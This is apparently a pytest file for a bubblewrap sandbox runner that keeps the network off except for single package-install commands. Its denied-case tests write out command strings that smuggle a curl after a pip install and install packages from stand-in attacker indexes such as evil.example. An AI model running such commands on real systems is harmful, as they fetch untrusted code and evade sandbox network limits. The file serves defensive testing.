"""Network stays off except for a single package install."""

import shutil
import socket
import threading
from pathlib import Path

import pytest

from pari.sandbox.base import SandboxLimits, network_allowed
from pari.sandbox.bwrap import BwrapSandboxRunner


def _interfaces(stdout: str) -> list[str]:
    return [line.strip() for line in stdout.splitlines() if line.strip()]


def _serve_marker(marker: bytes) -> tuple[socket.socket, int]:
    """Answer one localhost request. A shared network would return marker."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", 0))
    server.listen(1)

    def answer() -> None:
        try:
            conn, _addr = server.accept()
        except OSError:
            return
        with conn:
            head = (
                b"HTTP/1.1 200 OK\r\nContent-Length: "
                + str(len(marker)).encode("ascii")
                + b"\r\nConnection: close\r\n\r\n"
            )
            conn.sendall(head + marker)

    threading.Thread(target=answer, daemon=True).start()
    return server, server.getsockname()[1]


def test_network_unshared_by_default(tmp_path: Path):
    runner = BwrapSandboxRunner(tmp_path)
    res = runner.run_command("awk -F: '/^ *[a-z0-9]+:/ {print $1}' /proc/net/dev")
    assert res.exit_code == 0, res.stderr
    assert _interfaces(res.stdout) == ["lo"]


def test_composed_package_command_stays_offline(tmp_path: Path):
    runner = BwrapSandboxRunner(tmp_path)
    # pip writes its own lines to stdout. The interface list is the awk output.
    res = runner.run_command(
        "pip install requests >/dev/null; "
        "awk -F: '/^ *[a-z0-9]+:/ {print $1}' /proc/net/dev"
    )
    assert res.exit_code == 0, res.stderr
    assert _interfaces(res.stdout) == ["lo"]


def test_package_install_policy_allows_network():
    limits = SandboxLimits()
    assert network_allowed("pip install requests", limits) is True
    assert (
        network_allowed("pip install requests; curl http://example.com", limits)
        is False
    )
    assert network_allowed("pip install x & curl http://evil", limits) is False
    assert network_allowed("pip install x & true", limits) is False
    assert network_allowed("npm test", limits) is False


def test_single_package_installs_keep_the_network():
    limits = SandboxLimits()
    commands = (
        "pip install requests",
        "pip3 install requests",
        "npm install left-pad",
        "pnpm add left-pad",
        "yarn add left-pad",
        "cargo fetch",
        "poetry add requests",
        "uv sync",
    )
    for command in commands:
        assert network_allowed(command, limits) is True, command


def test_package_install_url_needs_an_explicit_network_grant():
    limits = SandboxLimits()
    denied = (
        "pip install --index-url http://evil.example/simple requests",
        "pip install --index-url=https://evil.example/simple requests",
        "pip install https://evil.example/pkg.whl",
        "npm install --registry http://evil.example/ lodash",
    )
    for command in denied:
        assert network_allowed(command, limits) is False, command
    explicit = SandboxLimits(allow_network=True)
    assert (
        network_allowed(
            "pip install --index-url http://evil.example/simple requests",
            explicit,
        )
        is True
    )


def test_background_curl_after_pip_cannot_reach_the_network(tmp_path: Path):
    if shutil.which("curl") is None:
        pytest.skip("curl is not installed")
    marker = b"pari-net-ok"
    server, port = _serve_marker(marker)
    command = f"pip install x & curl -fsS --max-time 3 http://127.0.0.1:{port}/"
    try:
        res = BwrapSandboxRunner(tmp_path).run_command(command)
    finally:
        server.close()
    text = marker.decode("ascii")
    assert res.exit_code != 0
    assert "curl:" in res.stderr
    assert text not in res.stdout
    assert text not in res.stderr


def test_network_command_can_read_the_resolver(tmp_path: Path):
    runner = BwrapSandboxRunner(tmp_path, limits=SandboxLimits(allow_network=True))
    res = runner.run_command("grep -q nameserver /etc/resolv.conf && echo dns_ok")
    assert res.exit_code == 0, res.stderr
    assert "dns_ok" in res.stdout


def test_allow_network_sees_host_interfaces(tmp_path: Path):
    runner = BwrapSandboxRunner(tmp_path, limits=SandboxLimits(allow_network=True))
    res = runner.run_command("awk -F: '/^ *[a-z0-9]+:/ {print $1}' /proc/net/dev")
    assert res.exit_code == 0, res.stderr
    assert _interfaces(res.stdout) != ["lo"]
